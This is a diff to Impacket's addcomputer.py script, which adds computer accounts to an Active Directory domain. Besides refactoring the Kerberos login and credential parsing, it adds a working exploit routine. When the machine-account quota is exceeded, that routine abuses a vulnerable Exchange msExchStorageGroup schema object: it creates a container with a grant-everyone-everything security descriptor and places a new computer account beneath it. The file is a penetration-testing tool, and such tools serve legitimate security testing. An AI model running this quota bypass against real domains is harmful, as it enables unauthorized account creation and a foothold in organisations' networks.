@@ -1,7 +1,9 @@
 #!/usr/bin/env python
 # Impacket - Collection of Python classes for working with network protocols.
 #
-# Copyright (C) 2022 Fortra. All rights reserved.
+# Copyright Fortra, LLC and its affiliated companies 
+#
+# All rights reserved.
 #
 # This software is provided under a slightly modified version
 # of the Apache Software License. See the accompanying LICENSE file
@@ -29,9 +31,13 @@ from __future__ import unicode_literals
 
 from impacket import version
 from impacket.examples import logger
-from impacket.examples.utils import parse_credentials
+from impacket.examples.utils import parse_identity
 from impacket.dcerpc.v5 import samr, epm, transport
 from impacket.spnego import SPNEGO_NegTokenInit, TypesMech
+from ldap3.protocol.microsoft import security_descriptor_control
+from ldap3.utils.conv import escape_filter_chars
+
+from impacket.examples.utils import ldap3_kerberos_login
 
 import ldap3
 import argparse
@@ -66,6 +72,11 @@ class ADDCOMPUTER:
         self.__targetIp = cmdLineOptions.dc_ip
         self.__baseDN = cmdLineOptions.baseDN
         self.__computerGroup = cmdLineOptions.computer_group
+
+        lmhash, nthash = self.__hashes.split(':') if self.__hashes is not None else ("", "")
+        if lmhash == '' and len(nthash) == 32:
+            self.__lmhash = 'aad3b435b51404eeaad3b435b51404ee'
+            self.__hashes = ":".join([self.__lmhash, nthash])
 
         if self.__targetIp is not None:
             self.__kdcHost = self.__targetIp
@@ -142,6 +153,63 @@ class ADDCOMPUTER:
         rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)
         self.doSAMRAdd(rpctransport)
 
+    def getUserInfo(self, ldapConn, username):
+        ldapConn.search(self.__baseDN, '(sAMAccountName=%s)' % escape_filter_chars(username), attributes=['objectSid'])
+        try:
+            dn = ldapConn.entries[0].entry_dn
+            sid = ldapConn.entries[0]['objectSid']
+            return (dn, sid)
+        except IndexError:
+            logging.error('User not found in LDAP: %s' % username)
+            return False
+
+    def bypass_with_msExchStorageGroup(self, ldapConn, ucd):
+        logging.info('Checking if `msExchStorageGroup` object exists within the schema and is vulnerable')
+        res = ldapConn.search(ldapConn.server.info.other['schemaNamingContext'][0], '(cn=ms-Exch-Storage-Group)',
+            search_scope=ldap3.LEVEL, attributes=['possSuperiors'])
+        
+        if not res:
+            logging.error('Object `msExchStorageGroup` does not exist within the schema, Exchange is probably not installed')
+            return False
+        
+        if 'computer' not in ldapConn.response[0]['attributes']['possSuperiors']:
+            logging.error('Object `msExchStorageGroup` not vulnerable, was probably patched')
+            return False
+
+        logging.info('Object `msExchStorageGroup` exists and is vulnerable!')
+
+        result = self.getUserInfo(ldapConn, self.__username)
+        if not result:
+            logging.error("Could not find target user in domain.")
+            return False
+
+        ACL_ALLOW_EVERYONE_EVERYTHING = b'\x01\x00\x04\x9c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x000\x00\x02\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\n\x14\x00\x00\x00\x00\x10\x01\x01\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00'
+        target_dn = result[0]
+        mESG_name = ''.join(random.choice(string.ascii_uppercase) for _ in range(8))
+        mESG_dn = ('CN=%s,%s' % (mESG_name, target_dn))
+
+        logging.info('Attempting to add new `msExchStorageGroup` object `%s` under `%s`' % (mESG_name, target_dn))
+        res = ldapConn.add(mESG_dn, ['top', 'container', 'msExchStorageGroup'],
+            {'nTSecurityDescriptor': ACL_ALLOW_EVERYONE_EVERYTHING}, controls=security_descriptor_control(sdflags=0x04))
+
+        if not res:
+            logging.error('Failed to add `msExchStorageGroup` object: %s' % str(ldapConn.result))
+            return False
+
+        logging.info('Added `msExchStorageGroup` object at `%s`. DON\'T FORGET TO CLEANUP' % mESG_dn)
+
+        computerHostname = self.__computerName[:-1]
+
+        newComputerDn = 'CN=%s,%s' % (computerHostname, mESG_dn)
+        logging.info('Attempting to create computer in `%s`', mESG_dn)
+        res = ldapConn.add(newComputerDn, ['top','person','organizationalPerson','user','computer'], ucd)
+
+        if not res:
+            logging.error('Failed to add a new computer: %s' % str(ldapConn.result))
+            return False
+
+        logging.info('Adding new computer with username: %s and password: %s result: OK' % (self.__computerName, self.__computerPassword))
+
     def run_ldaps(self):
         connectTo = self.__target
         if self.__targetIp is not None:
@@ -153,7 +221,7 @@ class ADDCOMPUTER:
                 ldapServer = ldap3.Server(connectTo, use_ssl=True, port=self.__port, get_info=ldap3.ALL, tls=tls)
                 if self.__doKerberos:
                     ldapConn = ldap3.Connection(ldapServer)
-                    self.LDAP3KerberosLogin(ldapConn, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
+                    ldap3_kerberos_login(ldapConn, connectTo, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                                                  self.__aesKey, kdcHost=self.__kdcHost)
                 elif self.__hashes is not None:
                     ldapConn = ldap3.Connection(ldapServer, user=user, password=self.__hashes, authentication=ldap3.NTLM)
@@ -168,11 +236,13 @@ class ADDCOMPUTER:
                 ldapServer = ldap3.Server(connectTo, use_ssl=True, port=self.__port, get_info=ldap3.ALL, tls=tls)
                 if self.__doKerberos:
                     ldapConn = ldap3.Connection(ldapServer)
-                    self.LDAP3KerberosLogin(ldapConn, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
+                    ldap3_kerberos_login(ldapConn, connectTo, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                                                  self.__aesKey, kdcHost=self.__kdcHost)
                 elif self.__hashes is not None:
                     ldapConn = ldap3.Connection(ldapServer, user=user, password=self.__hashes, authentication=ldap3.NTLM)
-                    ldapConn.bind()
+                    bind_res = ldapConn.bind()
+                    if not bind_res:
+                        raise Exception(ldapConn.result)
                 else:
                     ldapConn = ldap3.Connection(ldapServer, user=user, password=self.__password, authentication=ldap3.NTLM)
                     ldapConn.bind()
@@ -238,7 +308,10 @@ class ADDCOMPUTER:
                     if ldapConn.result['result'] == ldap3.core.results.RESULT_UNWILLING_TO_PERFORM:
                         error_code = int(ldapConn.result['message'].split(':')[0].strip(), 16)
                         if error_code == 0x216D:
-                            raise Exception("User %s machine quota exceeded!" % self.__username)
+                            logging.critical("User %s machine quota exceeded!" % self.__username)
+                            if self.__username.endswith('$'):
+                                logging.info("Trying to bypass machine quota with `msExchStorageGroup` object")
+                                self.bypass_with_msExchStorageGroup(ldapConn, ucd)
                         else:
                             raise Exception(str(ldapConn.result))
                     elif ldapConn.result['result'] == ldap3.core.results.RESULT_INSUFFICIENT_ACCESS_RIGHTS:
@@ -262,135 +335,6 @@ class ADDCOMPUTER:
     def LDAPGetComputer(self, connection, computerName):
         connection.search(self.__baseDN, '(sAMAccountName=%s)' % computerName)
         return connection.entries[0]
-
-    def LDAP3KerberosLogin(self, connection, user, password, domain='', lmhash='', nthash='', aesKey='', kdcHost=None, TGT=None,
-                      TGS=None, useCache=True):
-        from pyasn1.codec.ber import encoder, decoder
-        from pyasn1.type.univ import noValue
-        """
-        logins into the target system explicitly using Kerberos. Hashes are used if RC4_HMAC is supported.
-
-        :param string user: username
-        :param string password: password for the user
-        :param string domain: domain where the account is valid for (required)
-        :param string lmhash: LMHASH used to authenticate using hashes (password is not used)
-        :param string nthash: NTHASH used to authenticate using hashes (password is not used)
-        :param string aesKey: aes256-cts-hmac-sha1-96 or aes128-cts-hmac-sha1-96 used for Kerberos authentication
-        :param string kdcHost: hostname or IP Address for the KDC. If None, the domain will be used (it needs to resolve tho)
-        :param struct TGT: If there's a TGT available, send the structure here and it will be used
-        :param struct TGS: same for TGS. See smb3.py for the format
-        :param bool useCache: whether or not we should use the ccache for credentials lookup. If TGT or TGS are specified this is False
-
-        :return: True, raises an Exception if error.
-        """
-
-        if lmhash != '' or nthash != '':
-            if len(lmhash) % 2:
-                lmhash = '0' + lmhash
-            if len(nthash) % 2:
-                nthash = '0' + nthash
-            try:  # just in case they were converted already
-                lmhash = unhexlify(lmhash)
-                nthash = unhexlify(nthash)
-            except TypeError:
-                pass
-
-        # Importing down here so pyasn1 is not required if kerberos is not used.
-        from impacket.krb5.ccache import CCache
-        from impacket.krb5.asn1 import AP_REQ, Authenticator, TGS_REP, seq_set
-        from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
-        from impacket.krb5 import constants
-        from impacket.krb5.types import Principal, KerberosTime, Ticket
-        import datetime
-
-        if TGT is not None or TGS is not None:
-            useCache = False
-
-        targetName = 'ldap/%s' % self.__target
-        if useCache:
-            domain, user, TGT, TGS = CCache.parseFile(domain, user, targetName)
-
-        # First of all, we need to get a TGT for the user
-        userName = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
-        if TGT is None:
-            if TGS is None:
-                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, password, domain, lmhash, nthash,
-                                                                        aesKey, kdcHost)
-        else:
-            tgt = TGT['KDC_REP']
-            cipher = TGT['cipher']
-            sessionKey = TGT['sessionKey']
-
-        if TGS is None:
-            serverName = Principal(targetName, type=constants.PrincipalNameType.NT_SRV_INST.value)
-            tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, domain, kdcHost, tgt, cipher,
-                                                                    sessionKey)
-        else:
-            tgs = TGS['KDC_REP']
-            cipher = TGS['cipher']
-            sessionKey = TGS['sessionKey']
-
-            # Let's build a NegTokenInit with a Kerberos REQ_AP
-
-        blob = SPNEGO_NegTokenInit()
-
-        # Kerberos
-        blob['MechTypes'] = [TypesMech['MS KRB5 - Microsoft Kerberos 5']]
-
-        # Let's extract the ticket from the TGS
-        tgs = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
-        ticket = Ticket()
-        ticket.from_asn1(tgs['ticket'])
-
-        # Now let's build the AP_REQ
-        apReq = AP_REQ()
-        apReq['pvno'] = 5
-        apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)
-
-        opts = []
-        apReq['ap-options'] = constants.encodeFlags(opts)
-        seq_set(apReq, 'ticket', ticket.to_asn1)
-
-        authenticator = Authenticator()
-        authenticator['authenticator-vno'] = 5
-        authenticator['crealm'] = domain
-        seq_set(authenticator, 'cname', userName.components_to_asn1)
-        now = datetime.datetime.utcnow()
-
-        authenticator['cusec'] = now.microsecond
-        authenticator['ctime'] = KerberosTime.to_asn1(now)
-
-        encodedAuthenticator = encoder.encode(authenticator)
-
-        # Key Usage 11
-        # AP-REQ Authenticator (includes application authenticator
-        # subkey), encrypted with the application session key
-        # (Section 5.5.1)
-        encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 11, encodedAuthenticator, None)
-
-        apReq['authenticator'] = noValue
-        apReq['authenticator']['etype'] = cipher.enctype
-        apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator
-
-        blob['MechToken'] = encoder.encode(apReq)
-
-
-        request = ldap3.operation.bind.bind_operation(connection.version, ldap3.SASL, user, None, 'GSS-SPNEGO', blob.getData())
-
-        # Done with the Kerberos saga, now let's get into LDAP
-        # try to open connection if closed
-        if connection.closed:
-            connection.open(read_server_info=False)
-
-        connection.sasl_in_progress = True
-        response = connection.post_send_single_response(connection.send('bindRequest', request, None))
-        connection.sasl_in_progress = False
-        if response[0]['result'] != 0:
-            raise Exception(response)
-
-        connection.bound = True
-
-        return True
 
     def generateComputerName(self):
         return 'DESKTOP-' + (''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8)) + '$')
@@ -479,16 +423,7 @@ class ADDCOMPUTER:
                             else:
                                 raise
 
-                try:
-                    createUser = samr.hSamrCreateUser2InDomain(dce, domainHandle, self.__computerName, samr.USER_WORKSTATION_TRUST_ACCOUNT, samr.USER_FORCE_PASSWORD_CHANGE,)
-                except samr.DCERPCSessionError as e:
-                    if e.error_code == 0xc0000022:
-                        raise Exception("User %s doesn't have right to create a machine account!" % self.__username)
-                    elif e.error_code == 0xc00002e7:
-                        raise Exception("User %s machine quota exceeded!" % self.__username)
-                    else:
-                        raise
-
+                createUser = samr.hSamrCreateUser2InDomain(dce, domainHandle, self.__computerName, samr.USER_WORKSTATION_TRUST_ACCOUNT, samr.USER_FORCE_PASSWORD_CHANGE,)
                 userHandle = createUser['UserHandle']
 
             if self.__delete:
@@ -533,9 +468,7 @@ class ADDCOMPUTER:
 
 # Process command-line arguments.
 if __name__ == '__main__':
-    # Init the example's logger theme
-    logger.init()
-    print((version.BANNER))
+    print(version.BANNER)
 
     parser = argparse.ArgumentParser(add_help = True, description = "Adds a computer account to domain")
 
@@ -550,6 +483,7 @@ if __name__ == '__main__':
                                                                                  'If omitted, a random [A-Za-z0-9]{32} will be used.')
     parser.add_argument('-no-add', action='store_true', help='Don\'t add a computer, only set password on existing one.')
     parser.add_argument('-delete', action='store_true', help='Delete an existing computer.')
+    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
     parser.add_argument('-method', choices=['SAMR', 'LDAPS'], default='SAMR', help='Method of adding the computer.'
                                                                                 'SAMR works over SMB.'
@@ -591,28 +525,15 @@ if __name__ == '__main__':
 
     options = parser.parse_args()
 
-    if options.debug is True:
-        logging.getLogger().setLevel(logging.DEBUG)
-        # Print the Library's installation path
-        logging.debug(version.getInstallationPath())
-    else:
-        logging.getLogger().setLevel(logging.INFO)
+    logger.init(options.ts, options.debug)
+    
+    domain, username, password, _, _, options.k = parse_identity(options.account, options.hashes, options.no_pass, options.aesKey, options.k)
 
-    domain, username, password = parse_credentials(options.account)
+    if domain == '':
+        logging.critical('Domain should be specified!')
+        sys.exit(1)
 
     try:
-        if domain is None or domain == '':
-            logging.critical('Domain should be specified!')
-            sys.exit(1)
-
-        if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
-            from getpass import getpass
-            password = getpass("Password:")
-
-        if options.aesKey is not None:
-            options.k = True
-
-
         executer = ADDCOMPUTER(username, password, domain, options)
         executer.run()
     except Exception as e:
